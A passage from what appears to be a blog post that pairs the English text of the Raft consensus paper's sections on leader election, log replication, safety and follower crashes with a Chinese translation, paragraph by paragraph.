RPCs）。<strong>候选者会一直保持自身状态，直到以下三种情况中的任何一种发生：（a）它赢得了选举，成为了领导者（b）其他候选者赢得了领导者的地位，（c）选举超时，未能成功的选出领导者。这些结果将在下文各段中单独讨论。</strong></p><p>A candidate wins an election if it receives votes from a majority of the servers in the full cluster for the same term. Each server will vote for at most one candidate in a given term, on a first-come-first-served basis (note: Section 5.4 adds an additional restriction on votes). The majority rule ensures that at most one candidate can win the election for a particular term (the Election Safety Property in Figure 3). Once a candidate wins an election, it becomes leader. It then sends heartbeat messages to all of the other servers to establish its authority and prevent new elections.</p><p>如果候选者在同一任期内收到来自整个集群中大多数服务器的投票，那么它将赢得选举。每个服务器都按照先到先服务的原则投出它有且仅有一个的选票。多数原则确保了在特定的任期内最多有一个候选者能够赢得选举（图3中的选举安全属性）。一旦候选者赢得选举，它就成为了领导者。然后，它向其他的所有服务器发送心跳消息，告知自身的领导者状态并阻止新的选举。</p><p>While waiting for votes, a candidate may receive an AppendEntries RPC from another server claiming to be leader. If the leader’s term (included in its RPC) is at least as large as the candidate’s current term, then the candidate recognizes the leader as legitimate and returns to follower state. If the term in the RPC is smaller than the candidate’s current term, then the candidate rejects the RPC and continues in candidate state.</p><p>在等待投票时，候选者可能会收到其他声称是领导者的复制日志条目 RPC（ AppendEntries RPC）。如果领导者的任期（被包含在它的RPC请求中）和候选者的当前任期相同（或者大于候选者的任期），那么候选者就承认领导者是合法的，并且从候选者状态转换成跟随者的状态。如果RPC请求中的任期信息小于当前候选者的任期，当前候选者则会拒绝该RPC并且继续处于候选者状态。</p><p>The third possible outcome is that a candidate neither wins nor loses the election: if many followers become candidates at the same time, votes could be split so that no candidate obtains a majority. When this happens, each candidate will time out and start a new election by incrementing its term and initiating another round of RequestVote RPCs. However, without extra measures split votes could repeat indefinitely.</p><p>第三种可能的结果是候选者既没有赢得选举也没有输掉选举：如果很多跟随者同时成为候选者，选票就可能会被分割，最终可能是没有候选者获得多数票。当这种情况发生时，每一位候选者都将进入选举超时状态，之后通过增加它们的任期和发送新一轮的请求投票RPCs（RequestVote RPCs）来发起新一轮的选举。然而，如果不采用额外的措施，分裂的投票（split votes）将会无限的重复。</p><p>Raft uses randomized election timeouts to ensure that split votes are rare and that they are resolved quickly. To prevent split votes in the first place, election timeouts are chosen randomly from a fixed interval (e.g., 150–300ms). This spreads out the servers so that in most cases only a single server will time out; it wins the election and sends heartbeats before any other servers time out. The same mechanism is used to handle split votes. Each candidate restarts its randomized election timeout at the start of an election, and it waits for that timeout to elapse before starting the next election; this reduces the likelihood of another split vote in the new election. Section 9.3 shows that this approach elects a leader rapidly.</p><p>Raft使用随机的选举超时时间来确保分裂投票（split votes）很少发生，或者即使发生了也能很快的被解决。为了在一开始就避免分裂投票的发生，选举超时时间被设定为一个固定范围（例如150-300毫秒）中的随机值。这就能够使服务器很好的分散开来，确保在大多数场景下只会有一个服务器发生选举超时；当一个服务器赢得选举后，它能够在其他服务器选举超时之前向它们发送心跳信息。每一个候选者在选举开始时会重置一个随机的选举超时时间，然后等待超时时间的带来，之后再重新启动下一轮的选举，这就大大减少了下一次选举时分裂投票的情况发生。第9.3节表明，这种方法能够快速的选举出领导者。</p><p>Elections are an example of how understandability guided our choice between design alternatives. Initially we planned to use a ranking system: each candidate was assigned a unique rank, which was used to select between competing candidates. If a candidate discovered another candidate with higher rank, it would return to follower state so that the higher ranking candidate could more easily win the next election. We found that this approach created subtle issues around availability (a lower-ranked server might need to time out and become a candidate again if a higher-ranked server fails, but if it does so too soon, it can reset progress towards electing a leader). We made adjustments to the algorithm several times, but after each adjustment new corner cases appeared. Eventually we concluded that the randomized retry approach is more obvious and understandable.</p><p>选举这一个例子很好的说明了我们是如何根据可理解性做出设计选择的。设计之初，我们计划使用一个排名系统，每个候选者被分配一个唯一的排名，以用于候选者之间的竞争。如果一个候选者发现了另一个排名更高的候选者则会返回到跟随者状态，这样级别更高的候选者就可以很容易的赢得下一次选举。但是我们发现这种方法在可用性方面有一些小问题（当排名较高的服务器选举失败后，排名较低的服务器会等待选举超时的到来然后再次成为候选者，并开始新一轮的选举，但是如果排名较高的服务器又很快就失败了，那这就会影响领导者选举的进度）。我们对算法进行了很多次的调整，但每一次的调整都会引入新的问题。最终我们得出结论，随机重试这种方法更明确，也更易于理解。</p><h3 id="5-3、Log-replication（日志复制）"><a href="#5-3、Log-replication（日志复制）" class="headerlink" title="5.3、Log replication（日志复制）"></a>5.3、Log replication（日志复制）</h3><p>Once a leader has been elected, it begins servicing client requests. Each client request contains a command to be executed by the replicated state machines. The leader appends the command to its log as a new entry, then issues AppendEntries RPCs in parallel to each of the other servers to replicate the entry. When the entry has been safely replicated (as described below), the leader applies the entry to its state machine and returns the result of that execution to the client. If followers crash or run slowly, or if network packets are lost, the leader retries AppendEntries RPCs indefinitely (even after it has responded to the client) until all followers eventually store all log entries.</p><p>一旦一个领导者被选出，它就开始接受处理客户端的请求。每个客户端的请求都会包含一条需要状态机执行的命令。领导者将命令作为一个新条目追加到自身的日志中，然后并行的发送追加条目RPCs（AppendEntries RPCs）到其他的服务器进行日志条目的复制。当条目被安全的复制（如下所述）后，领导者将该条目应用于其状态机，并将执行结果返回给客户端。如果跟随者发生宕机，运行缓慢或网络数据包丢失等情况，领导者会无限次的重试发送AppendEntries RPCs，直到所有的跟随者都成功复制了所有的日志条目。</p><p><a href="https://cdn.bugwz.com/raft-logs.png"><img src="https://cdn.bugwz.com/raft-logs.png" alt="Raft Logs">Raft Logs</a></p><p>Figure 6: Logs are composed of entries, which are numbered sequentially. Each entry contains the term in which it was created (the number in each box) and a command for the state machine. An entry is considered committed if it is safe for that entry to be applied to state machines.</p><p>图6：日志由按顺序编号的条目组成。每个条目在被创建时都包含一个任期（term）（每个框中的数字）和一个状态机的命令。如果该条目可以安全地应用于状态机，则该条目被视为已提交。</p><p>Logs are organized as shown in Figure 6. Each log entry stores a state machine command along with the term number when the entry was received by the leader. The term numbers in log entries are used to detect inconsistencies between logs and to ensure some of the properties in Figure 3. Each log entry also has an integer index identifying its position in the log.</p><p>日志的存储形式如上图6所示。每个日志条目都存储着一条状态机命令和一个领导者接受条目时的任期号。日志条目中的任期号主要用于检测日志之间的不一致性，并确保图3中的某些属性。每一个日志条目都有一个整数索引，用于标识其在日志中的存储位置。</p><p>The leader decides when it is safe to apply a log entry to the state machines; such an entry is called committed. Raft guarantees that committed entries are durable and will eventually be executed by all of the available state machines. A log entry is committed once the leader that created the entry has replicated it on a majority of the servers (e.g., entry 7 in Figure 6). This also commits all preceding entries in the leader’s log, including entries created by previous leaders. Section 5.4 discusses some subtleties when applying this rule after leader changes, and it also shows that this definition of commitment is safe. The leader keeps track of the highest index it knows to be committed, and it includes that index in future AppendEntries RPCs (including heartbeats) so that the other servers eventually find out. Once a follower learns that a log entry is committed, it applies the entry to its local state machine (in log order).</p><p>领导者决定对状态机应用日志条目的安全时机，这样的条目称为提交（committed）。Raft保证提交后的条目是持久的，并且最终将被所有可用的状态机执行。当一个日志条目被集群中的大多数服务器成功复制后，它就会被领导者提交（例如图6中的条目7），这一个过程同时也会将此条目之前的所有日志条目一并提交，包括之前任期的领导者所创建的条目。第5.4节讨论了领导者发生变动后应用这个规则的微妙之处，同时也说明了这个承诺的定义是安全的。领导者会一直跟踪最新提交的日志条目索引，并将它包含在随后的Append Entries RPCs（包括心跳）中，以便其他服务器识别，并应用到自身状态机。</p><p>We designed the Raft log mechanism to maintain a high level of coherency between the logs on different servers. Not only does this simplify the system’s behavior and make it more predictable, but it is an important component of ensuring safety. Raft maintains the following properties, which together constitute the Log Matching Property in Figure 3:</p><ul><li>If two entries in different logs have the same index and term, then they store the same command.</li><li>If two entries in different logs have the same index and term, then the logs are identical in all preceding entries.</li></ul><p>我们设计了Raft的日志机制来保证不同服务器上日志之间的高度一致性。这不仅简化了系统的行为，提高了可预测性，并且也是确保安全的重要组成部分。Raft维护了以下特性，这些特性共同构成图3中的日志匹配特性：</p><ul><li><strong>如果不同日志中的两个条目具有相同的索引和任期号，则它们存储着相同的命令。</strong></li><li><strong>如果不同日志中的两个条目具有相同的索引和任期号，则之前所有的条目中的日志都是相同的。</strong></li></ul><p>The first property follows from the fact that a leader creates at most one entry with a given log index in a given term, and log entries never change their position in the log. The second property is guaranteed by a simple consistency check performed by AppendEntries. When sending an AppendEntries RPC, the leader includes the index and term of the entry in its log that immediately precedes the new entries. If the follower does not find an entry in its log with the same index and term, then it refuses the new entries. The consistency check acts as an induction step: the initial empty state of the logs satisfies the Log Matching Property, and the consistency check preserves the Log Matching Property whenever logs are extended. As a result, whenever AppendEntries returns successfully, the leader knows that the follower’s log is identical to its own log up through the new entries.</p><p>第一个特性表明，领导者在一个日志索引位置至多只会创建一个日志条目，并且日志中的条目位置都是固定的。第二个特性由AppendEntries执行的简单一致性检查来保证。在发送Append Entries RPCs时，领导者会将要发送的最新条目之前的条目索引（preLogIndex）及任期号（preLogTerm）包含进去，<strong>如果跟随者在其日志中找不到匹配的前置条目索引和前置任期号，则拒绝该日志条目</strong>。一致性检查执行符合递归特性：初始的空日志满足日志匹配属性（Log Matching Property），随着每一次日志扩充，一致性检查都确保符合Log Matching Property。因此，每当AppendEntries成功返回时，领导者就知道跟随者的日志在新通过的日志及之前的日志和自己的保持一致。</p><p>During normal operation, the logs of the leader and followers stay consistent, so the AppendEntries consistency check never fails. However, leader crashes can leave the logs inconsistent (the old leader may not have fully replicated all of the entries in its log). These inconsistencies can compound over a series of leader and follower crashes. Figure 7 illustrates the ways in which followers’ logs may differ from that of a new leader. A follower may be missing entries that are present on the leader, it may have extra entries that are not present on the leader, or both. Missing and extraneous entries in a log may span multiple terms.</p><p>正常情况下，领导者和跟随者的日志能够保持一致，因此一致性检查不会失败。但是，当领导者宕机后，就会出现日志不一致的情况（旧的领导者可能还会有一部分日志没来得及成功的复制给跟随者）。日志的不一致会随着一系列的领导者和跟随者的宕机而变得更加严重。图7 中展示了跟随者和新的领导者日志的不同之处。跟随者可能会缺少一些领导者中存在的日志条目，也有可能拥有一些领导者中不存在的日志条目，或者这两种情况都存在。日志中丢失的和无关的条目可能跨越多个任期。</p><p><a href="https://cdn.bugwz.com/raft-logs-diff.png"><img src="https://cdn.bugwz.com/raft-logs-diff.png" alt="Diff Logs">Diff Logs</a></p><p>Figure 7: When the leader at the top comes to power, it is possible that any of scenarios (a–f) could occur in follower logs. Each box represents one log entry; the number in the box is its term. A follower may be missing entries (a–b), may have extra uncommitted entries (c–d), or both (e–f). For example, scenario (f) could occur if that server was the leader for term 2, added several entries to its log, then crashed before committing any of them; it restarted quickly, became leader for term 3, and added a few more entries to its log; before any of the entries in either term 2 or term 3 were committed, the server crashed again and remained down for several terms.</p><p>图7：第一行的是领导者，跟随者可能有（a-f）几种场景。每个框代表一个日志条目；方框中的数字是它的任期。跟随者可能缺少条目（a–b），可能有额外的未提交条目（c–d），或者两者都有（e–f）。例如，场景（f）发生时，该服务器可能是任期2的领导者，在其日志中添加了几个条目后，然后在提交日志条目之前崩溃；它很快重新启动，然后成为了任期3的领导者，并在日志中添加了一些日志条目，在提交第2项或第3项中的日志条目之前再次宕机，并在接下来的几个任期内始终处于宕机状态。</p><p>In Raft, the leader handles inconsistencies by forcing the followers’ logs to duplicate its own. This means that conflicting entries in follower logs will be overwritten with entries from the leader’s log. Section 5.4 will show that this is safe when coupled with one more restriction.</p><p>在Raft中，领导者通过强制跟随者复制自己的日志来处理日志的不一致问题。这意味着，跟随者中不一致的日志条目会被领导者中的日志条目所覆盖。</p><p>To bring a follower’s log into consistency with its own, the leader must find the latest log entry where the two logs agree, delete any entries in the follower’s log after that point, and send the follower all of the leader’s entries after that point. All of these actions happen in response to the consistency check performed by AppendEntries RPCs. The leader maintains a nextIndex for each follower, which is the index of the next log entry the leader will send to that follower. When a leader first comes to power, it initializes all nextIndex values to the index just after the last one in its log (11 in Figure 7). If a follower’s log is inconsistent with the leader’s, the AppendEntries consistency check will fail in the next AppendEntries RPC. After a rejection, the leader decrements nextIndex and retries the AppendEntries RPC. Eventually nextIndex will reach a point where the leader and follower logs match. When this happens, AppendEntries will succeed, which removes any conflicting entries in the follower’s log and appends entries from the leader’s log (if any). Once AppendEntries succeeds, the follower’s log is consistent with the leader’s, and it will remain that way for the rest of the term.</p><p>为了使跟随者的日志与自己的日志保持一致，领导者必须找到两个日志一致的最新日志条目，删除该点之后跟随者日志中的所有条目，并在该点之后将领导者的所有条目发送给跟随者。所有这些操作都是由AppendEntries RPCs的一致性检查引发执行的。<strong>领导者为每个跟随者都维护了一个nextIndex变量，它是领导者将要发送给改跟随者的下一个日志条目的索引。当一个领导者第一次掌权时，它会将所有跟随者的nextIndex初始化为最后一个日志条目的下一个索引（图7中的11）。如果跟随者与领导者的日志不一致，AppendEntries的一致性检查就会在下一次的Append Entries RPCs中返回失败。一次失败后，领导者就会将该跟随着的nextIndex减1，然后重新发送Append Entries RPCs，如此循环往复，直到找到一个领导者和跟随者的日志能通过AppendEntries的一致性检查的nextIndex值。此时，AppendEntries将成功执行，这将删除跟随者日志中任何冲突的条目，并复制领导者此索引之后的所有日志同步给跟随者。</strong>一旦AppendEntries成功，追随者的日志与领导者的日志是一致的，并且在余下的任期内都将保持这种状态。</p><p>If desired, the protocol can be optimized to reduce the number of rejected AppendEntries RPCs. For example, when rejecting an AppendEntries request, the follower can include the term of the conflicting entry and the first index it stores for that term. With this information, the leader can decrement nextIndex to bypass all of the conflicting entries in that term; one AppendEntries RPC will be required for each term with conflicting entries, rather than one RPC per entry. In practice, we doubt this optimization is necessary, since failures happen infrequently and it is unlikely that there will be many inconsistent entries.</p><p>如果需要的话，可以对协议进行优化，以减少被拒绝的RPC的数量。例如，当拒绝AppendEntries RPCs时，跟随者可以将包括冲突条目的任期和此任期内存储的第一个条目返回给领导者。这样，领导者就可以将nextIndex直接减去所有冲突的条目最早的那个条目。一个任期内的日志条目冲突只需要一次AppendEntries RPCs就可以，而不需要像之前那样每个条目一次AppendEntries RPCs。但是在实际应用中，我们认为此优化是完全没有必要的，因为AppendEntries RPCs请求失败并不是经常发生，并且好像也不会有很多冲突的日志条目。</p><p>With this mechanism, a leader does not need to take any special actions to restore log consistency when it comes to power. It just begins normal operation, and the logs automatically converge in response to failures of the AppendEntries consistency check. A leader never overwrites or deletes entries in its own log (the Leader Append-Only Property in Figure 3).</p><p>通过这种机制，当一个领导者掌权时，不需要采取任何额外的措施来恢复日志一致性。它只需要执行正常的操作，日志就会随着AppendEntries的一致性检查自动收敛。<strong>领导者永远不会覆盖或删除自己日志中的条目（图3中的Leader Append Only属性）。</strong></p><p>This log replication mechanism exhibits the desirable consensus properties described in Section 2: Raft can accept, replicate, and apply new log entries as long as a majority of the servers are up; in the normal case a new entry can be replicated with a single round of RPCs to a majority of the cluster; and a single slow follower will not impact performance.</p><p>这中日志复制机制展示了我们在第2节中描述的共识属性：Raft只要在大多数服务器正常运行的情况下就能执行日志条目的接收，复制和应用。正常情况下一次RPCs就能完成一个日志条目的复制，单个跟随者的操作延迟不影响整体性能。</p><h3 id="5-4、Safety（安全性）"><a href="#5-4、Safety（安全性）" class="headerlink" title="5.4、Safety（安全性）"></a>5.4、Safety（安全性）</h3><p>The previous sections described how Raft elects leaders and replicates log entries. However, the mechanisms described so far are not quite sufficient to ensure that each state machine executes exactly the same commands in the same order. For example, a follower might be unavailable while the leader commits several log entries, then it could be elected leader and overwrite these entries with new ones; as a result, different state machines might execute different command sequences.</p><p>之前的章节描述了Raft如何进行领导选举和日志复制的。但是，到目前为止所描述的机制并不能很有效的保证每一个状态机以同样的顺序执行执行同样的命令。例如，在一个跟随者不可用的时候，领导者提交了一些日志条目，然后该跟随者恢复正常后被选举成了领导者，然后使用新的日志条目覆盖掉了之前的领导者提交了但没有被成功复制的那些条目。这样的话，不同服务器的状态机可能就执行了不同的命令序列。</p><p>This section completes the Raft algorithm by adding a restriction on which servers may be elected leader. The restriction ensures that the leader for any given term contains all of the entries committed in previous terms (the Leader Completeness Property from Figure 3). Given the election restriction, we then make the rules for commitment more precise. Finally, we present a proof sketch for the Leader Completeness Property and show how it leads to correct behavior of the replicated state machine.</p><p>这一章节对于可能会被选为领导者的服务器添加了一些限制。使得特定任期内的领导者能够包含之前任期内提交的日志条目（图3中的Leader Completion属性）。通过增加了这些选举限制，我们进一步细化了提交规则。最后，我们呈现了一个领导者完备性（Leader Completeness Property）的证明草图，并展示了它是如何指导状态机正确执行的。</p><h4 id="5-4-1、Election-restriction（选举限制）"><a href="#5-4-1、Election-restriction（选举限制）" class="headerlink" title="5.4.1、Election restriction（选举限制）"></a>5.4.1、Election restriction（选举限制）</h4><p>In any leader-based consensus algorithm, the leader must eventually store all of the committed log entries. In some consensus algorithms, such as Viewstamped Replication [22], a leader can be elected even if it doesn’t initially contain all of the committed entries. These algorithms contain additional mechanisms to identify the missing entries and transmit them to the new leader, either during the election process or shortly afterwards. Unfortunately, this results in considerable additional mechanism and complexity. Raft uses a simpler approach where it guarantees that all the committed entries from previous terms are present on each new leader from the moment of its election, without the need to transfer those entries to the leader. This means that log entries only flow in one direction, from leaders to followers, and leaders never overwrite existing entries in their logs.</p><p>在任何基于领导者的共识算法（leader-based consensus algorithm）中，领导者最终都必须保存着所有提交的日志条目。在一些共识算法中，比如 Viewstamped Replication[22]，即使一开始没有包含所有提交的条目，也可以选出一个领导者。这些算法包含额外的机制来识别丢失的条目，并在选举过程中或之后不久将其传送给新的领导人。不幸的是，这带来了相当多的额外机制和复杂性。Raft使用一种简单的方法使得之前领导者提交的日志条目能够在一选举出新的领导者时就能完整的程现在领导者上，而不需要任何的传送。这就意味着，<strong>日志条目只会从领导者流向跟随者，领导者永远不会覆盖其日志中的现有条目</strong>。</p><p><a href="https://cdn.bugwz.com/raft-time-sequence.png"><img src="https://cdn.bugwz.com/raft-time-sequence.png" alt="Time Sequence">Time Sequence</a></p><p>Figure 8: A time sequence showing why a leader cannot determine commitment using log entries from older terms. In (a) S1 is leader and partially replicates the log entry at index 2. In (b) S1 crashes; S5 is elected leader for term 3 with votes from S3, S4, and itself, and accepts a different entry at log index 2. In © S5 crashes; S1 restarts, is elected leader, and continues replication. At this point, the log entry from term 2 has been replicated on a majority of the servers, but it is not committed. If S1 crashes as in (d), S5 could be elected leader (with votes from S2, S3, and S4) and overwrite the entry with its own entry from term 3. However, if S1 replicates an entry from its current term on a majority of the servers before crashing, as in (e), then this entry is committed (S5 cannot win an election). At this point all preceding entries in the log are committed as well.</p><p>图 8：该时间序列显示了为什么领导者不能使用历史任期的日志条目来确定承诺（determine commitment）。 (a) S1 是领导者，部分复制了索引 2 处的日志条目。 (b) S1 崩溃，S5 被选为第 3 任期的领导者（来自S3、S4 和它自己的投票），并在日志索引 2 处接受不同的条目。 © S5 宕机， S1 重新启动，被选为领导者，并继续复制。 此时第 2 项的日志条目已在大多数服务器上复制，但尚未提交。 （d）S1再次宕机，则S5可以被选为领导（来自S2，S3和S4的投票）并从第 3 任期中覆盖其自身条目的条目。但是，如果S1在崩溃之前在大多数服务器上复制了其当前任期的条目，如（e）中所示，之后该条目被提交（则S5无法赢得选举）。此时，日志中所有前面的条目也将提交。</p><p>Raft uses the voting process to prevent a candidate from winning an election unless its log contains all committed entries. A candidate must contact a majority of the cluster in order to be elected, which means that every committed entry must be present in at least one of those servers. If the candidate’s log is at least as up-to-date as any other log in that majority (where “up-to-date” is defined precisely below), then it will hold all the committed entries. The RequestVote RPC implements this restriction: the RPC includes information about the candidate’s log, and the voter denies its vote if its own log is more up-to-date than that of the candidate.</p><p>Raft使用投票过程来阻止候选者赢得选举，除非它的日志包含所有提交的条目。候选者必须联系集群的大多数成员才能当选，这意味着每个提交的条目必须至少出现在其中一个服务器中。如果候选者的日志至少和大多数人的日志一样都是最新的（下面精确地定义了“最新”），那么它将保存所有提交的条目。RequestVote RPC实现了这个限制：RPC中包含了关于候选者日志的信息，<strong>如果投票者自己的日志比候选者的日志更新得多，投票者就拒绝投票。</strong></p><p>Raft determines which of two logs is more up-to-date by comparing the index and term of the last entries in the logs. If the logs have last entries with different terms, then the log with the later term is more up-to-date. If the logs end with the same term, then whichever log is longer is more up-to-date.</p><p><strong>Raft通过比较两个服务器上日志的最后一个日志条目的任期和索引来决定谁的日志时最新的。任期不同，则任期大的日志新。任期相同，则索引大的日志新。</strong></p><h4 id="5-4-2、Committing-entries-from-previous-terms（提交前置任期的条目）"><a href="#5-4-2、Committing-entries-from-previous-terms（提交前置任期的条目）" class="headerlink" title="5.4.2、Committing entries from previous terms（提交前置任期的条目）"></a>5.4.2、Committing entries from previous terms（提交前置任期的条目）</h4><p>As described in Section 5.3, a leader knows that an entry from its current term is committed once that entry is stored on a majority of the servers. If a leader crashes before committing an entry, future leaders will attempt to finish replicating the entry. However, a leader cannot immediately conclude that an entry from a previous term is committed once it is stored on a majority of servers. Figure 8 illustrates a situation where an old log entry is stored on a majority of servers, yet can still be overwritten by a future leader.</p><p>如第 5.3 节所述，一旦该条目存储在大多数服务器上，领导者就知道其当前任期中的条目已提交。 如果领导者在提交条目之前崩溃，未来的领导者将尝试完成复制该条目。 然而，领导者不能立即断定前一任期的条目是否已经存储在大多数服务器上并完成了提交。 图 8 中说明了一种场景，存在大多数服务器上的日志条目被新的领导者的日志给覆盖了。</p><p><a href="https://cdn.bugwz.com/raft-overlay-log.png"><img src="https://cdn.bugwz.com/raft-overlay-log.png" alt="Overlay Log">Overlay Log</a></p><p>Figure 9: If S1 (leader for term T) commits a new log entry from its term, and S5 is elected leader for a later term U, then there must be at least one server (S3) that accepted the log entry and also voted for S5.</p><p>图 9：如果 S1（任期 T 的领导者）在其任期中提交了一个新的日志条目，并且 S5 被选为以后任期 U 的领导者，那么必须至少有一个服务器（S3）接受该日志条目并投票给 S5。</p><p>To eliminate problems like the one in Figure 8, Raft never commits log entries from previous terms by counting replicas. Only log entries from the leader’s current term are committed by counting replicas; once an entry from the current term has been committed in this way, then all prior entries are committed indirectly because of the Log Matching Property. There are some situations where a leader could safely conclude that an older log entry is committed (for example, if that entry is stored on every server), but Raft takes a more conservative approach for simplicity.</p><p>为了消除图 8 中的这种问题，<strong>Raft 从来不会通过计算副本数来决定是否提交上一个任期的日志条目</strong>。 只有领导者当期的日志条目需要通过计算备份数来决定提交。一旦当前任期内的一个日志条目以这种方式被提交了，那么根据 Log Matching Property 的限制，所有之前的所有日志条目也就间接的被提交了。在某些情况下，领导者能够立即识别一个旧的日志条目是否被提交了（例如，如果该条目存储在每个服务器上），但是Raft为了简洁，选择了使用更加保守的方法。</p><p>Raft incurs this extra complexity in the commitment rules because log entries retain their original term numbers when a leader replicates entries from previous terms. In other consensus algorithms, if a new leader rereplicates entries from prior “terms,” it must do so with its new “term number.” Raft’s approach makes it easier to reason about log entries, since they maintain the same term number over time and across logs. In addition, new leaders in Raft send fewer log entries from previous terms than in other algorithms (other algorithms must send redundant log entries to renumber them before they can be committed).</p><p>Raft 在提交规则中会产生这种额外的复杂性，因为<strong>当领导者从以前的任期复制条目时，日志条目会保留其原始任期号。 在其他共识算法中，如果一个新的领导者从之前的“任期”中重新复制条目，它必须使用新的“任期号”这样做</strong>。 Raft 的方法使推理日志条目变得更容易，因为它们随着时间的推移和跨日志保持相同的术语编号。 此外，与其他算法相比，Raft 中的新领导者发送的之前任期中的日志条目更少（其他算法必须发送冗余日志条目来重新编号，然后才能提交）。</p><h4 id="5-4-3、Safety-argument（安全论证）"><a href="#5-4-3、Safety-argument（安全论证）" class="headerlink" title="5.4.3、Safety argument（安全论证）"></a>5.4.3、Safety argument（安全论证）</h4><p>Given the complete Raft algorithm, we can now argue more precisely that the Leader Completeness Property holds (this argument is based on the safety proof; see Section 9.2). We assume that the Leader Completeness Property does not hold, then we prove a contradiction. Suppose the leader for term T (leaderT) commits a log entry from its term, but that log entry is not stored by the leader of some future term. Consider the smallest term U &gt; T whose leader (leaderU) does not store the entry.</p><ol><li>The committed entry must have been absent from leaderU’s log at the time of its election (leaders never delete or overwrite entries).</li><li>leaderT replicated the entry on a majority of the cluster, and leaderU received votes from a majority of the cluster. Thus, at least one server (“the voter”) both accepted the entry from leaderT and voted for leaderU, as shown in Figure 9. The voter is key to reaching a contradiction.</li><li>The voter must have accepted the committed entry from leaderT before voting for leaderU; otherwise it would have rejected the AppendEntries request from leaderT (its current term would have been higher than T).</li><li>The voter still stored the entry when it voted for leaderU, since every intervening leader contained the entry (by assumption), leaders never remove entries, and followers only remove entries if they conflict with the leader.</li><li>The voter granted its vote to leaderU, so leaderU’s log must have been as up-to-date as the voter’s. This leads to one of two contradictions.</li><li>First, if the voter and leaderU shared the same last log term, then leaderU’s log must have been at least as long as the voter’s, so its log contained every entry in the voter’s log. This is a contradiction, since the voter contained the committed entry and leaderU was assumed not to.</li><li>Otherwise, leaderU’s last log term must have been larger than the voter’s. Moreover, it was larger than T, since the voter’s last log term was at least T (it contains the committed entry from term T). The earlier leader that created leaderU’s last log entry must have contained the committed entry in its log (by assumption). Then, by the Log Matching Property, leaderU’s log must also contain the committed entry, which is a contradiction.</li><li>This completes the contradiction. Thus, the leaders of all terms greater than T must contain all entries from term T that are committed in term T.</li><li>The Log Matching Property guarantees that future leaders will also contain entries that are committed indirectly, such as index 2 in Figure 8(d).</li></ol><p>给出了完整的 Raft 算法，我们现在可以进一步的对领导者完备性（Leader Completeness Property）进行论证。（这个论证基于安全性证明，参见第 9.2 节）。 首先我们假设Leader Completeness Property 不成立，那么我们需要提出一个矛盾点。 假设任期为T的领导者T (Leader T) 提交了其任期内的日志条目，但是这个日志条目并没有被之后任期的领导者存储。 假设存在没有存储这条日志条目的领导者U（Leader U），其中任期U大于任期T。</p><ol><li>在LeaderU当选时，它的日志里面肯定没有这个已经被提交的日志条目。（领导者永远不会删除或覆盖条目）。</li><li>LeaderT 已经将该日志条目复制给了集群中的大多数成员，LeaderU在选举时收到了集群大多数成员的投票。 因此，至少有一个服务器（”“投票者”）同时接受了来自 LeaderT 的日志条目并投票给了 LeaderU，如图 9 所示。投票者是达成矛盾的关键。</li><li>投票者在给LeaderU之前必然已经接受了LeaderT提交的日志条目，否则它将拒绝来自 LeaderT 的 AppendEntries 请求（拒绝的时候，其当前任期将高于 T）。</li><li>投票者在投票给 LeaderU 时还存储该条目，因为每个参与其中的领导者都包含该条目（假设），领导者从不删除条目，而跟随者仅在与领导者冲突时才会删除条目。</li><li>投票者把选票给了LeaderU，因此LeaderU的日志必须和投票者的日志一样都是最新的。 这导致了两个矛盾中的一个。</li><li>首先，如果投票者和LeaderU 的最后一个日志任期相同，那么LeaderU 的日志必须至少和投票者一样长，所以它的日志包含了投票者日志中的每一个条目。 这是一个矛盾，因为投票者包含了被提交的条目，而LeaderU 则没有。</li><li>否则，LeaderU 的最后一个日志任期必须大于投票者的。 进一步说，它大于 T，因为投票者的最后一个日志期限至少是 T（它包含来自期限 T 的提交条目）。假设，创建 LeaderU 的最后一个日志条目的较早的领导者的日志中必须包含已经提交的日志条目，那么，根据日志匹配属性，LeaderU 的日志也必须包含提交的条目，这是一个矛盾。</li><li>这就完成了矛盾。 因此，所有任期大于 T 的领导者必须包含任期 T 中已经提交的所有日志条目。</li><li>Log Matching Property保证未来的领导者也将包含间接提交的条目，例如图 8(d) 中的索引 2。</li></ol><p>Given the Leader Completeness Property, we can prove the State Machine Safety Property from Figure 3, which states that if a server has applied a log entry at a given index to its state machine, no other server will ever apply a different log entry for the same index. At the time a server applies a log entry to its state machine, its log must be identical to the leader’s log up through that entry and the entry must be committed. Now consider the lowest term in which any server applies a given log index; the Log Completeness Property guarantees that the leaders for all higher terms will store that same log entry, so servers that apply the index in later terms will apply the same value. Thus, the State Machine Safety Property holds.</p><p>依据领导者完整性属性（Leader Completeness Property），我们可以证明图 3 中的状态机安全属性（State Machine Safety Property），它指出如果服务器已将给定索引处的日志条目应用于其状态机，则没有其他服务器会为同一索引应用不同的日志条目。当服务器已经将日志条目应用于其状态机时，其日志必须与通过该条目成为领导者的日志相同，并且该日志条目必须已经被提交了。现在考虑任何服务器应用给定日志索引的最低期限； 日志完整性属性（Log Completeness Property）保证所有更高任期的领导者将存储相同的日志条目，因此在以后的任期中应用索引的服务器将应用相同的值。 因此，状态机安全属性（State Machine Safety Property）成立。</p><p>Finally, Raft requires servers to apply entries in log index order. Combined with the State Machine Safety Property, this means that all servers will apply exactly the same set of log entries to their state machines, in the same order.</p><p>最后，Raft 要求服务器按日志索引顺序应用条目。 结合状态机安全属性（State Machine Safety Property），这意味着所有服务器都将以相同的顺序将完全相同的日志条目集应用于其状态机。</p><h3 id="5-5、Follower-and-candidate-crashes（跟随者和候选者宕机）"><a href="#5-5、Follower-and-candidate-crashes（跟随者和候选者宕机）" class="headerlink" title="5.5、Follower and candidate crashes（跟随者和候选者宕机）"></a>5.5、Follower and candidate crashes（跟随者和候选者宕机）</h3><p>Until this point we have focused on leader failures. Follower and candidate crashes are much simpler to handle than leader crashes, and they are both handled in the same way. If a follower or candidate crashes, then future RequestVote and AppendEntries RPCs sent to it will fail. Raft handles these failures by retrying indefinitely; if the crashed server restarts, then the RPC will complete successfully. If a server crashes after completing an RPC but before responding, then it will receive the same RPC again after it restarts. Raft RPCs are idempotent, so this causes no harm. For example, if a follower receives an AppendEntries request that includes log entries already present in its log, it ignores those entries in the new request.</p><p>到目前为止，我们的关注点都在领导者的失败上。 跟随者和候选者的失败相对来说，更容易进行处理，处理机制也与领导者相同。如果追随者或候选者发生了宕机，那么之后发送给它们的 RequestVote RPCs 和 AppendEntries RPCs 将失败。 Raft 通过无限重试来处理这些失败； 如果宕机的服务器重新启动，则 RPC 将成功完成请求。 当服务器接收处理完RPC请求，但是在回复之前宕机，那么它会在重新启动后再次收到相同的 RPC。 Raft RPC 